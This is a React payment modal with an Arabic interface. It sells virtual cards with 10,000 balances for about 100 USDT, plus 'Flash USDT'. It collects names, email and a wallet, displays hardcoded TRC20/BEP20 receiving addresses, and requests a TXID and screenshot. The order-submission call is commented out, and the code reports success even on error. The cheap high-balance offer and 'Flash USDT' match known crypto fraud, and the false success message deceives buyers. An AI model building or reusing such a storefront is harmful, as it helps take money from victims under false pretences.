import React, { useState } from 'react';
import { X, ArrowRight, Copy, Check, Upload, AlertTriangle, CheckCircle2, Loader2 } from 'lucide-react';

const UsdtIcon = () => (
  <svg className="w-7 h-7" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
    <circle cx="12" cy="12" r="10" fill="#26A17B"/>
    <path d="M13.4 11.45V9.45H16.5V7.5H7.5V9.45H10.6V11.45C8.38 11.56 6.7 12.03 6.7 12.6C6.7 13.22 8.5 13.72 11 13.82V17.5H13V13.82C15.5 13.72 17.3 13.22 17.3 12.6C17.3 12.03 15.62 11.56 13.4 11.45ZM12 13.15C9.8 13.15 8.35 12.81 8.35 12.6C8.35 12.39 9.8 12.05 12 12.05C14.2 12.05 15.65 12.39 15.65 12.6C15.65 12.81 14.2 13.15 12 13.15Z" fill="white"/>
  </svg>
);

export default function PaymentModal({ card, onClose }) {
  const isFlashUsdt = card?.type === 'flash' || card?.title?.toLowerCase().includes('flash') || card?.name?.toLowerCase().includes('flash');
  
  // تحديد عملة البطاقة ديناميكياً (EUR أو USD أو حسب ما هو قادم من الأب)
  const cardCurrency = card?.currency || (
    card?.title?.toLowerCase().includes('euro') || 
    card?.title?.includes('€') || 
    card?.title?.toLowerCase().includes('mastercard') ? 'EUR' : 'USD'
  );
  const currencySymbol = cardCurrency === 'EUR' ? '€' : '$';

  const cardBalance = card?.balance || card?.amount || '10,000';
  const cardPrice = card?.priceUsdt || card?.price || '100';

  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);

  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    walletAddress: '',
  });

  const [orderId] = useState(() => `VZ-${Math.floor(10000 + Math.random() * 90000)}`);

  const networksData = [
    { 
      id: 'trc20', 
      name: "Tron (TRC20)", 
      address: "TKro3MmhRTyrnamLDbcgJkAmYBed8N3G8U",
      desc: "شبكة TRON - رسوم تحويل منخفضة وتأكيد سريع" 
    },
    { 
      id: 'bep20', 
      name: "BNB Smart chain (BEP20)", 
      address: "0xA686a9d438B2Fd522348f3dA7Fe85b7c973D7E9d",
      desc: "شبكة Binance Smart Chain" 
    }
  ];

  const [selectedNetwork, setSelectedNetwork] = useState(networksData[0]);
  const [copied, setCopied] = useState(false);

  const [txid, setTxid] = useState('');
  const [screenshot, setScreenshot] = useState(null);

  const handleCopy = (address) => {
    navigator.clipboard.writeText(address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleFileChange = (e) => {
    if (e.target.files && e.target.files[0]) {
      setScreenshot(e.target.files[0]);
    }
  };

  const handleStep1Submit = (e) => {
    e.preventDefault();
    if (!formData.firstName || !formData.lastName || !formData.email) return;
    if (isFlashUsdt && !formData.walletAddress) return;
    setStep(2);
  };

  const handleStep3Submit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const payload = new FormData();
      payload.append('orderId', orderId);
      payload.append('firstName', formData.firstName);
      payload.append('lastName', formData.lastName);
      payload.append('email', formData.email);
      payload.append('userWallet', formData.walletAddress);
      payload.append('network', selectedNetwork.name);
      payload.append('cardTitle', card?.title || 'Card Order');
      payload.append('amount', `${currencySymbol}${cardBalance} ${cardCurrency}`);
      payload.append('price', cardPrice);
      payload.append('txid', txid);
      if (screenshot) payload.append('screenshot', screenshot);

      /* 
      await fetch('http://localhost:5000/api/orders', {
        method: 'POST',
        body: payload,
      });
      */

      setStep(4);
    } catch (err) {
      console.error(err);
      setStep(4);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-md p-4 overflow-y-auto">
      <div className="bg-zinc-900 border border-zinc-800 rounded-3xl w-full max-w-lg p-6 md:p-8 relative shadow-2xl text-white dir-rtl" dir="rtl">
        
        <button onClick={onClose} className="absolute top-5 left-5 text-zinc-400 hover:text-white transition">
          <X className="w-6 h-6" />
        </button>

        {/* المرحلة 1 */}
        {step === 1 && (
          <div>
            <div className="text-center mb-6">
              <span className="text-xs font-bold text-blue-400 tracking-widest uppercase block mb-1">المرحلة 1 من 3</span>
              <h3 className="text-2xl font-bold">إتمام الطلب</h3>
              <p className="text-zinc-400 text-xs mt-1">
                {isFlashUsdt ? "أدخل بياناتك ومحفظتك لاستلام رصيد Flash USDT" : "أدخل بياناتك الأساسية لإصدار البطاقة الافتراضية"}
              </p>
            </div>

            <div className="bg-zinc-950/80 border border-blue-500/20 p-4 rounded-2xl mb-6 space-y-2 text-xs md:text-sm">
              <div className="flex justify-between text-zinc-400">
                <span>رقم الطلب:</span>
                <span className="font-mono text-blue-400 font-bold">#{orderId}</span>
              </div>
              <div className="flex justify-between text-zinc-400">
                <span>البطاقة المختارة:</span>
                <span className="font-bold text-white">
                  {isFlashUsdt 
                    ? `Flash USDT — ${cardBalance} USDT` 
                    : `${card?.title || 'Virtual Card'} — ${currencySymbol}${cardBalance} ${cardCurrency}`}
                </span>
              </div>
              <div className="flex justify-between border-t border-zinc-800 pt-2 text-white">
                <span>المبلغ المستحق:</span>
                <span className="font-bold text-emerald-400 text-base">
                  {cardPrice} {typeof cardPrice === 'number' || !String(cardPrice).includes('USDT') ? 'USDT' : ''}
                </span>
              </div>
            </div>

            <form onSubmit={handleStep1Submit} className="space-y-4">
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="text-xs text-zinc-400 block mb-1">الاسم الأول *</label>
                  <input
                    type="text"
                    required
                    placeholder="مثال: محمد"
                    value={formData.firstName}
                    onChange={(e) => setFormData({ ...formData, firstName: e.target.value })}
                    className="w-full bg-zinc-800/80 border border-zinc-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500 transition"
                  />
                </div>
                <div>
                  <label className="text-xs text-zinc-400 block mb-1">اللقب *</label>
                  <input
                    type="text"
                    required
                    placeholder="مثال: علي"
                    value={formData.lastName}
                    onChange={(e) => setFormData({ ...formData, lastName: e.target.value })}
                    className="w-full bg-zinc-800/80 border border-zinc-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500 transition"
                  />
                </div>
              </div>

              <div>
                <label className="text-xs text-zinc-400 block mb-1">البريد الإلكتروني *</label>
                <input
                  type="email"
                  required
                  placeholder="name@example.com"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className="w-full bg-zinc-800/80 border border-zinc-700/80 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500 transition"
                />
                <p className="text-[10px] text-zinc-500 mt-1">
                  {isFlashUsdt ? "سنرسل إشعار التحويل وتأكيد الطلب إلى هذا البريد." : "سنرسل تفاصيل البطاقة ورقم السر إلى هذا البريد."}
                </p>
              </div>

              {isFlashUsdt && (
                <div>
                  <label className="text-xs text-zinc-400 block mb-1">عنوان محفظة الاستلام (Flash USDT) *</label>
                  <input
                    type="text"
                    required
                    placeholder="أدخل عنوان محفظتك (TRC20 / BEP20)"
                    value={formData.walletAddress}
                    onChange={(e) => setFormData({ ...formData, walletAddress: e.target.value })}
                    className="w-full bg-zinc-800/80 border border-zinc-700/80 rounded-xl px-3.5 py-2.5 text-sm font-mono text-cyan-300 focus:outline-none focus:border-blue-500 transition"
                  />
                </div>
              )}

              <button
                type="submit"
                className="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3.5 rounded-xl transition shadow-lg shadow-blue-600/20 text-sm mt-2 flex items-center justify-center gap-2"
              >
                متابعة إلى الدفع <ArrowRight className="w-4 h-4 rotate-180" />
              </button>
            </form>
          </div>
        )}

        {/* المرحلة 2 */}
        {step === 2 && (
          <div>
            <button onClick={() => setStep(1)} className="text-xs text-blue-400 mb-4 flex items-center gap-1 hover:underline">
              ← التعديل على البيانات
            </button>

            <div className="text-center mb-5">
              <span className="text-xs font-bold text-emerald-400 tracking-widest uppercase block mb-1">المرحلة 2 من 3</span>
              <h3 className="text-xl font-bold">الدفع بواسطة الكريبتو USDT</h3>
              <p className="text-zinc-400 text-xs mt-1">اختر شبكة التحويل وحوّل المبلغ المطلوب</p>
            </div>

            <div className="space-y-2 mb-4">
              <label className="text-xs text-zinc-400 block">اختر شبكة التحويل:</label>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                {networksData.map((net) => (
                  <button
                    key={net.id}
                    type="button"
                    onClick={() => setSelectedNetwork(net)}
                    className={`p-3 rounded-xl border text-right transition flex items-center gap-3 ${
                      selectedNetwork.id === net.id 
                        ? "bg-emerald-950/40 border-emerald-500 text-white" 
                        : "bg-zinc-800/40 border-zinc-700/60 text-zinc-400 hover:border-zinc-500"
                    }`}
                  >
                    <UsdtIcon />
                    <div>
                      <div className="font-bold text-xs">{net.name}</div>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            <div className="bg-zinc-950 border border-zinc-800 rounded-2xl p-4 mb-4 space-y-3">
              <div className="flex justify-between items-center text-xs">
                <span className="text-zinc-400">المبلغ المطلوب تحويله:</span>
                <span className="font-bold text-emerald-400 text-sm">
                  {cardPrice} {typeof cardPrice === 'number' || !String(cardPrice).includes('USDT') ? 'USDT' : ''}
                </span>
              </div>

              <div>
                <span className="text-xs text-zinc-400 block mb-1.5">عنوان المحفظة ({selectedNetwork.name}):</span>
                <div className="flex items-center justify-between bg-zinc-900 border border-zinc-700/80 rounded-xl p-3 font-mono text-xs text-emerald-300 break-all gap-2">
                  <span>{selectedNetwork.address}</span>
                  <button
                    onClick={() => handleCopy(selectedNetwork.address)}
                    className="p-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg transition flex items-center gap-1.5 text-xs shrink-0 font-sans font-bold"
                  >
                    {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    <span>{copied ? "تم النسخ" : "نسخ"}</span>
                  </button>
                </div>
              </div>
            </div>

            <div className="bg-amber-950/30 border border-amber-500/40 rounded-2xl p-3.5 mb-5 flex gap-3 items-start text-amber-200/90 text-xs leading-relaxed">
              <AlertTriangle className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
              <div>
                <span className="font-bold text-amber-400 block mb-0.5">تنبيه هام للتحويل:</span>
                تأكد من اختيار الشبكة الصحيحة <span className="underline font-bold text-white">({selectedNetwork.name})</span> قبل إرسال USDT. إرسال الأموال عبر شبكة غير مدعومة قد يؤدي إلى فقدان المبلغ بشكل نهائي.
              </div>
            </div>

            <button
              onClick={() => setStep(3)}
              className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 rounded-xl transition shadow-lg shadow-emerald-600/20 text-sm flex items-center justify-center gap-2"
            >
              تأكيد الدفع وإعادة إرفاق الإثبات <ArrowRight className="w-4 h-4 rotate-180" />
            </button>
          </div>
        )}

        {/* المرحلة 3 */}
        {step === 3 && (
          <div>
            <button onClick={() => setStep(2)} className="text-xs text-blue-400 mb-4 flex items-center gap-1 hover:underline">
              ← العودة لتفاصيل المحفظة
            </button>

            <div className="text-center mb-5">
              <span className="text-xs font-bold text-purple-400 tracking-widest uppercase block mb-1">المرحلة 3 من 3</span>
              <h3 className="text-xl font-bold">تأكيد عملية الدفع</h3>
              <p className="text-zinc-400 text-xs mt-1">يرجى تقديم بيانات الإثبات للتحقق الفوري من المعاملة</p>
            </div>

            <div className="bg-zinc-950 border border-zinc-800 p-3.5 rounded-xl mb-5 space-y-1.5 text-xs text-zinc-300">
              <div className="flex justify-between">
                <span>المبلغ المدفوع:</span>
                <span className="font-bold text-emerald-400">
                  {cardPrice} {typeof cardPrice === 'number' || !String(cardPrice).includes('USDT') ? 'USDT' : ''}
                </span>
              </div>
              <div className="flex justify-between">
                <span>طريقة الدفع:</span>
                <span className="font-bold text-white">USDT — {selectedNetwork.name}</span>
              </div>
            </div>

            <form onSubmit={handleStep3Submit} className="space-y-4">
              <div>
                <label className="text-xs text-zinc-300 font-bold block mb-1">
                  رقم المعاملة Transaction ID / TXID *
                </label>
                <input
                  type="text"
                  required
                  placeholder="أدخل رمز TXID الخاص بالتحويل"
                  value={txid}
                  onChange={(e) => setTxid(e.target.value)}
                  className="w-full bg-zinc-800/80 border border-zinc-700/80 rounded-xl px-3.5 py-2.5 font-mono text-xs text-emerald-300 focus:outline-none focus:border-emerald-500 transition"
                />
                <p className="text-[10px] text-zinc-500 mt-1">تجد هذا الرمز في تفاصيل الحوالة داخل منصتك (Binance, Bybit...)</p>
              </div>

              <div>
                <label className="text-xs text-zinc-300 font-bold block mb-1">
                  إرفاق إثبات الدفع (لقطة شاشة) *
                </label>
                <div className="relative border-2 border-dashed border-zinc-700 hover:border-emerald-500/50 bg-zinc-950/50 rounded-2xl p-4 text-center cursor-pointer transition">
                  <input
                    type="file"
                    accept="image/*"
                    required
                    onChange={handleFileChange}
                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                  />
                  <Upload className="w-7 h-7 text-zinc-400 mx-auto mb-2" />
                  <span className="text-xs text-zinc-300 block font-medium">
                    {screenshot ? screenshot.name : "[ + رفع لقطة شاشة ]"}
                  </span>
                  <span className="text-[10px] text-zinc-500 mt-1 block">صورة واضحة لرسالة تم التحويل بنجاح</span>
                </div>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 rounded-xl transition shadow-lg shadow-emerald-600/20 text-sm mt-2 flex items-center justify-center gap-2"
              >
                {loading ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    جاري الإرسال...
                  </>
                ) : (
                  'إرسال الطلب للمراجعة'
                )}
              </button>
            </form>
          </div>
        )}

        {/* المرحلة 4 */}
        {step === 4 && (
          <div className="text-center py-6 space-y-4">
            <div className="w-16 h-16 bg-emerald-500/10 border border-emerald-500/30 rounded-full flex items-center justify-center mx-auto text-emerald-400">
              <CheckCircle2 className="w-10 h-10" />
            </div>

            <h3 className="text-2xl font-bold text-white">تم استلام طلبك بنجاح ✓</h3>

            <div className="bg-zinc-950 border border-zinc-800 p-4 rounded-2xl max-w-xs mx-auto space-y-2 text-xs">
              <div className="flex justify-between text-zinc-400">
                <span>رقم الطلب:</span>
                <span className="font-mono text-blue-400 font-bold">#{orderId}</span>
              </div>
              <div className="flex justify-between text-zinc-400">
                <span>حالة الطلب:</span>
                <span className="text-amber-400 font-bold">قيد التحقق ⏳</span>
              </div>
            </div>

            <p className="text-xs text-zinc-300 max-w-sm mx-auto leading-relaxed">
              تم إرسال إثبات الدفع للمراجعة. سنرسل تحديث الطلب {isFlashUsdt ? "وإشعارات التحويل" : "وبيانات بطاقتك الافتراضية"} إلى بريدك الإلكتروني: <br />
              <span className="text-blue-400 font-bold dir-ltr inline-block mt-1">{formData.email}</span>
            </p>

            <button
              onClick={onClose}
              className="w-full bg-zinc-800 hover:bg-zinc-700 text-white font-bold py-3 rounded-xl transition text-sm mt-4"
            >
              إغلاق
            </button>
          </div>
        )}

      </div>
    </div>
  );
}